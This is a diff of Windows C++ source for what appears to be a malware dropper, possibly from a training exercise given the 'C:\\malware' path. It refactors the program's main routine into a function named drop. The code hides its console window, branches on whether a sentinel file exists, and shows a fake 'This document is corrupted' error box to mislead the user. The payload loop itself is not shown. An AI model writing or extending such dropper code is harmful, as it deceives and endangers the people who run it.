@@ -4,14 +4,13 @@
 #include <fstream>
 #include <wininet.h>
 
-
-int main(int argc, char* argv[]) {
+int drop(char path[]){
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	FreeConsole();
 	WCHAR temppath[262];
 	WCHAR filepath[264];
-	char path[] = "C:\\malware\\ch0nky.txt";
+	//char path[] = "C:\\malware\\ch0nky.txt";
 	DWORD f_attrib = GetFileAttributesA(path);
 	if (f_attrib == 0xffffffff || ((f_attrib & 0x10) != 0)){
 		while (true) {
@@ -37,5 +36,8 @@ int main(int argc, char* argv[]) {
 		}
 	}
 	MessageBoxA((HWND)0x0, "Error, This document is corrupted", "Please delete the corrupted document", 0);
+	return 0;
+}
+int main(int argc, char* argv[]) {
 	return 0;
 }
